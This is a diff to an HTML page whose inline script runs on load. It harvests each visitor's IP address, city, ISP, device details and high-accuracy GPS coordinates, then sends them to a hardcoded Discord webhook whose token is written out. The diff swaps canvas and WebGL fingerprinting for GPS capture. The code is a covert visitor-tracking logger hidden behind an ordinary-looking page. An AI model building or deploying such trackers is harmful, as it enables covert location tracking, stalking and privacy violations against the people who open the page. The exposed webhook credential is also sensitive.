@@ -10,7 +10,7 @@
       font-family: Arial, Helvetica, sans-serif;
       height: 100vh; display: flex; align-items: center; justify-content: center; text-align: center;
     }
-    .container { max-width: 400px; }
+    .container { max-width: 420px; padding: 20px; }
     h1 { font-size: 34px; margin-bottom: 16px; }
     p { font-size: 18px; color: #666; }
   </style>
@@ -24,52 +24,34 @@
   <script>
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1516409431368269934/4qmFB9N79B2tVd0xWvh221dwRWNZ6gAJBwmrWW1nlKP_FkAA2JohWRG4G4RU-n8k_e_X";
 
-    async function getFingerprint() {
-      const fp = {
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language,
-        languages: navigator.languages ? navigator.languages.join(", ") : "Unknown",
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        screen: `${screen.width}x${screen.height}`,
-        colorDepth: screen.colorDepth,
-        pixelRatio: window.devicePixelRatio,
-        touchPoints: navigator.maxTouchPoints || 0,
-        deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown",
-        hardwareConcurrency: navigator.hardwareConcurrency || "Unknown",
-        isMobile: /Mobi|Android/i.test(navigator.userAgent)
-      };
-
-      // Canvas Fingerprint
-      try {
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-        ctx.textBaseline = "alphabetic";
-        ctx.font = "14px Arial";
-        ctx.fillText("Fingerprint Test", 2, 20);
-        fp.canvasHash = btoa(canvas.toDataURL());
-      } catch (e) { fp.canvasHash = "Blocked"; }
-
-      // WebGL Fingerprint
-      try {
-        const gl = document.createElement('canvas').getContext('webgl');
-        if (gl) {
-          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-          fp.webglVendor = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "Unknown";
-          fp.webglRenderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown";
-        }
-      } catch (e) { fp.webglVendor = "Blocked"; }
-
-      return fp;
-    }
-
     async function sendVisitorInfo() {
-      console.log("🚀 Collecting visitor data...");
-
-      let geo = { lat: null, lon: null };
+      let geo = { lat: null, lon: null, alt: null, accuracy: null, source: "None" };
       let ipInfo = { ip: "Unknown", city: "Unknown", region: "Unknown", country: "Unknown", isp: "Unknown" };
 
-      // IP + Geolocation (multiple services)
+      // === 1. Try Exact GPS (works on mobile too) ===
+      if ('geolocation' in navigator) {
+        try {
+          const position = await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject, {
+              enableHighAccuracy: true,
+              timeout: 10000,
+              maximumAge: 0
+            });
+          });
+
+          geo.lat = position.coords.latitude;
+          geo.lon = position.coords.longitude;
+          geo.alt = position.coords.altitude;
+          geo.accuracy = position.coords.accuracy;
+          geo.source = "GPS (User Allowed)";
+          console.log("✅ GPS Access Granted");
+        } catch (err) {
+          geo.source = "IP Fallback (GPS Denied)";
+          console.log("❌ GPS Denied, using IP fallback");
+        }
+      }
+
+      // === 2. IP + IP Geolocation ===
       const services = [
         'https://ip-api.com/json/?fields=query,city,regionName,country,isp,lat,lon',
         'https://ipapi.co/json/',
@@ -86,17 +68,33 @@
             ipInfo.region = data.regionName || data.region || "Unknown";
             ipInfo.country = data.country || data.country_name || "Unknown";
             ipInfo.isp = data.isp || data.org || "Unknown";
-            if (data.lat) geo.lat = data.lat;
-            if (data.lon) geo.lon = data.lon;
+
+            // Use IP coords as fallback
+            if (!geo.lat && data.lat) {
+              geo.lat = data.lat;
+              geo.lon = data.lon;
+            }
             break;
           }
         } catch (e) {}
       }
 
-      const fingerprint = await getFingerprint();
+      // === 3. Device & Browser Info ===
+      const deviceInfo = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        os: navigator.userAgent.includes("Android") ? "Android" :
+            navigator.userAgent.includes("iPhone") || navigator.userAgent.includes("iPad") ? "iOS" : "Desktop",
+        isMobile: /Mobi|Android|iPhone/i.test(navigator.userAgent),
+        screen: `${screen.width}×${screen.height}`,
+        language: navigator.language,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        hardware: navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : "Unknown"
+      };
 
-      const locationStr = geo.lat 
-        ? `${geo.lat.toFixed(4)}, ${geo.lon.toFixed(4)} (IP-based)` 
+      // === 4. Send to Discord ===
+      const locationText = geo.lat 
+        ? `${geo.lat.toFixed(6)}, ${geo.lon.toFixed(6)} ${geo.alt ? `(Altitude: ${geo.alt.toFixed(1)}m)` : ''} [${geo.accuracy ? geo.accuracy.toFixed(0)+'m' : ''}]`
         : "Unknown";
 
       try {
@@ -106,33 +104,31 @@
           body: JSON.stringify({
             content: "**New Visitor Detected**",
             embeds: [{
-              title: "Visitor Information",
+              title: "Visitor Details",
               color: 0x3498db,
               fields: [
                 { name: "IP Address", value: ipInfo.ip, inline: true },
                 { name: "City", value: ipInfo.city, inline: true },
-                { name: "Region", value: ipInfo.region, inline: true },
-                { name: "Country", value: ipInfo.country, inline: true },
-                { name: "Approx Coordinates", value: locationStr, inline: false },
+                { name: "Region / Country", value: `${ipInfo.region}, ${ipInfo.country}`, inline: true },
                 { name: "ISP", value: ipInfo.isp, inline: false },
-                { name: "Device / Browser", value: fingerprint.userAgent.substring(0, 200) + "...", inline: false },
-                { name: "Platform", value: fingerprint.platform, inline: true },
-                { name: "Is Mobile", value: fingerprint.isMobile ? "Yes" : "No", inline: true },
-                { name: "Screen", value: fingerprint.screen, inline: true },
-                { name: "Timezone", value: fingerprint.timezone, inline: true },
-                { name: "Languages", value: fingerprint.languages, inline: false },
-                { name: "Canvas Fingerprint", value: fingerprint.canvasHash ? fingerprint.canvasHash.substring(0, 60) + "..." : "N/A", inline: false }
+                { name: "Location", value: locationText, inline: false },
+                { name: "Location Source", value: geo.source, inline: false },
+                { name: "Device", value: deviceInfo.os + (deviceInfo.isMobile ? " (Mobile)" : " (Desktop)"), inline: true },
+                { name: "Screen", value: deviceInfo.screen, inline: true },
+                { name: "Timezone", value: deviceInfo.timezone, inline: true },
+                { name: "User Agent", value: deviceInfo.userAgent.substring(0, 180) + "...", inline: false }
               ]
             }]
           })
         });
-        console.log("✅ Data sent to Discord");
+        console.log("✅ Data sent successfully");
       } catch (e) {
-        console.error("Webhook error");
+        console.error("Webhook failed:", e);
       }
     }
 
-    window.onload = () => setTimeout(sendVisitorInfo, 1000);
+    // Start tracking
+    window.onload = () => setTimeout(sendVisitorInfo, 1200);
   </script>
 </body>
 </html>
